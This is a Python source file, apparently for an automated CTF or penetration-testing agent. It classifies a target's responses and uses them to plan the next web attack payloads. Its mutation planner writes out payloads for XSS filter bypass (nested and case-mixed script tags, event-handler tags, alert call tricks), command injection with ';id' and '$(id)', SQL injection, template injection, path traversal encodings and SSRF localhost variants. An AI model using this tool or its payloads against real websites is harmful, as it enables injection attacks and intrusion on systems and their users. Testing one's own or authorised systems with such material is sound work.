from __future__ import annotations

import re
from dataclasses import dataclass, field
from urllib.parse import quote


@dataclass(frozen=True)
class MutationContext:
    family: str
    payload: str
    blocked_chars: set[str] = field(default_factory=set)
    error_terms: set[str] = field(default_factory=set)
    max_variants: int = 8


@dataclass(frozen=True)
class OracleObservation:
    payload: str
    response_text: str
    status_code: int | None = None
    content_type: str = ""
    delivery: str = ""


@dataclass(frozen=True)
class OracleClassification:
    payload: str
    response_class: str
    observed_value: str = ""
    reflected_value: str = ""
    delivery: str = ""


class OracleGuidedPlanner:
    """Classify verifier-oracle responses and derive the next compact payload set."""

    _INSTEAD_OF_RE = re.compile(
        r"(?:observed|got|returned|result(?:\s+was)?|alert(?:ed)?(?:\s+with)?)"
        r"(?P<between>.{0,220}?)(?:instead\s+of|expected)",
        re.IGNORECASE | re.DOTALL,
    )

    def classify(self, observation: OracleObservation, *, expected: str = "") -> OracleClassification:
        text = str(observation.response_text or "")
        lowered = text.lower()
        payload = str(observation.payload or "")
        expected_lower = str(expected or "").lower()
        observed = self._observed_value(text)
        reflected = payload if payload and payload in text else ""
        if expected_lower and self._success_signal(lowered, expected_lower):
            response_class = "expected-proof"
        elif "typeerror" in lowered and ("instead of" in lowered or "expected" in lowered or "alert" in lowered):
            response_class = "verifier-type-error"
        elif observed and expected_lower and expected_lower not in observed.lower():
            response_class = "wrong-observed-value"
        elif observed:
            response_class = "observed-value"
        elif self._looks_tag_payload(payload) and self._looks_neutral(lowered):
            response_class = "tag-stripped-or-ignored"
        elif self._looks_neutral(lowered):
            response_class = "neutral-or-not-parsed"
        elif reflected:
            response_class = "reflected-inert"
        elif str(observation.status_code or "") in {"400", "405", "415"}:
            response_class = "method-or-parser-rejected"
        else:
            response_class = "unknown"
        return OracleClassification(
            payload=payload,
            response_class=response_class,
            observed_value=observed,
            reflected_value=reflected,
            delivery=str(observation.delivery or observation.content_type or ""),
        )

    def response_classes(self, observations: list[OracleObservation], *, expected: str = "") -> dict[str, list[OracleClassification]]:
        grouped: dict[str, list[OracleClassification]] = {}
        for obs in observations:
            item = self.classify(obs, expected=expected)
            grouped.setdefault(item.response_class, []).append(item)
        return grouped

    def guidance(self, observations: list[OracleObservation], *, expected: str = "", max_payloads: int = 12) -> dict[str, object]:
        grouped = self.response_classes(observations, expected=expected)
        stable_errors = {
            name
            for name, rows in grouped.items()
            if name in {"verifier-type-error", "neutral-or-not-parsed", "tag-stripped-or-ignored"} and len(rows) >= 2
        }
        changing = [name for name in grouped if name not in stable_errors]
        return {
            "response_classes": {name: len(rows) for name, rows in sorted(grouped.items())},
            "continue_classes": changing[:8],
            "stop_classes": sorted(stable_errors),
            "next_payloads": self.next_payloads(expected=expected or "XSS", observations=observations, max_variants=max_payloads),
            "strategy": "derive next payloads from response classes; continue only families that change class or observed value",
        }

    def next_payloads(self, *, expected: str, observations: list[OracleObservation] | None = None, max_variants: int = 12) -> list[str]:
        base = str(expected or "XSS")
        variants = PayloadMutationPlanner().suggest(MutationContext(family="xss_oracle", payload=base, max_variants=max(max_variants, 12)))
        observed_classes = set()
        for obs in observations or []:
            observed_classes.add(self.classify(obs, expected=base).response_class)
        if "tag-stripped-or-ignored" in observed_classes:
            variants = [
                f"<image/src/onerror=alert({base!r})>",
                f"<image/autofocus/onfocus=alert({base!r})>",
                quote(f"<svg/onload=alert({base!r})>", safe=""),
                f"<picture><source/srcset=x/onerror=alert({base!r})></picture>",
                f"<image>",
                f"&lt;script&gt;alert({base!r})&lt;/script&gt;",
                f"<ScRiPt>alert({base!r})</ScRiPt>",
                f"<scr<script>ipt>alert({base!r})</scr<script>ipt>",
                *variants,
            ]
        if "verifier-type-error" in observed_classes:
            variants.extend(
                [
                    f"alert.call(null,{base!r})",
                    f"alert.apply(null,[{base!r}])",
                    f"(0,alert)({base!r})",
                    f"setTimeout(function(){{alert({base!r})}},0)",
                    f"onerror=alert;throw {base!r}",
                    f"Function('return alert')()({base!r})",
                ]
            )
        deduped: list[str] = []
        for value in variants:
            if value and value not in deduped:
                deduped.append(value)
            if len(deduped) >= max(1, max_variants):
                break
        return deduped

    def _observed_value(self, text: str) -> str:
        match = self._INSTEAD_OF_RE.search(text or "")
        if not match:
            return ""
        value = re.sub(r"<[^>]+>", " ", match.group("between"))
        value = re.sub(r"\s+", " ", value).strip(" :;,.\"'")
        return value[-160:]

    def _success_signal(self, lowered: str, expected_lower: str) -> bool:
        if not expected_lower:
            return False
        success_terms = ("success", "solved", "congrat", "accepted", "proof matched", "validated")
        return expected_lower in lowered and any(term in lowered for term in success_terms)

    def _looks_tag_payload(self, payload: str) -> bool:
        return "<" in payload and ">" in payload

    def _looks_neutral(self, lowered: str) -> bool:
        return any(term in lowered for term in ("good luck", "start", "baseline", "no change", "try again"))


class PayloadMutationPlanner:
    """Evidence-guided compact payload mutation families."""

    def suggest(self, context: MutationContext) -> list[str]:
        family = context.family.strip().lower()
        base = context.payload
        variants: list[str] = []

        def add(value: str) -> None:
            if value and value not in variants and value != base and len(variants) < max(1, context.max_variants):
                variants.append(value)

        if family in {"traversal", "lfi", "file_read"}:
            add(base.replace("../", "..%2f"))
            add(base.replace("../", "%2e%2e/"))
            add(base.replace("../", "%252e%252e%252f"))
            add(base.replace("/", "\\"))
            add(base.replace("../", "....//"))
        elif family in {"xss", "html"}:
            add(base.replace("<script", "<img src=x onerror="))
            add("<svg/onload=alert(1)>")
            add("<img src=x onerror=alert(1)>")
            add("<z autofocus onfocus=alert(1)>")
            add(quote(base, safe=""))
        elif family in {"xss_oracle", "alert_oracle", "browser_verifier"}:
            expected = base.strip() or "XSS"
            quoted = expected if (expected.startswith(("'", '"')) and expected.endswith(("'", '"'))) else repr(expected)
            add(quoted)
            add(f'"{expected}"')
            add("+".join(repr(ch) for ch in expected))
            add("String.fromCharCode(" + ",".join(str(ord(ch)) for ch in expected) + ")")
            add(f"alert({quoted})")
            add(f"(0,alert)({quoted})")
            add(f"alert.call(null,{quoted})")
            add(f"alert.apply(null,[{quoted}])")
            add(f";alert({quoted})//")
            add(f"(()=>{quoted})()")
            add(f"setTimeout(function(){{alert({quoted})}},0)")
            add(f"onerror=alert;throw {quoted}")
            add(quote(expected, safe=""))
        elif family in {"ssti", "template"}:
            add("{{7*7}}")
            add("${7*7}")
            add("<%= 7*7 %>")
            add("{% include \"missing\" %}")
        elif family in {"command", "cmdi", "command_injection"}:
            for sep in [";", "&&", "|", "%0a", "`"]:
                if sep not in context.blocked_chars:
                    add(f"{base}{sep}id")
            add(f"{base}$(id)")
        elif family in {"sql", "sqli", "query"}:
            add(base + "'")
            add(base + "'--")
            add(base + "'/*")
            add(base + "\"")
            add(base + "%27--")
        elif family in {"ssrf", "url"}:
            add(base.replace("127.0.0.1", "localhost"))
            add(base.replace("localhost", "127.0.0.1"))
            add(base.replace("http://", "http://127.1/"))
            add(quote(base, safe=":/?=&"))
            add(quote(quote(base, safe=""), safe=""))
        else:
            add(quote(base, safe=""))
            add(quote(quote(base, safe=""), safe=""))
            add(base.swapcase())

        if "quote" in context.error_terms and family not in {"sql", "sqli", "query"}:
            add(base.replace("'", "%27").replace('"', "%22"))
        if "space" in context.error_terms or "whitespace" in context.error_terms:
            add(base.replace(" ", "/**/"))
            add(base.replace(" ", "%09"))
        return variants[: max(1, context.max_variants)]
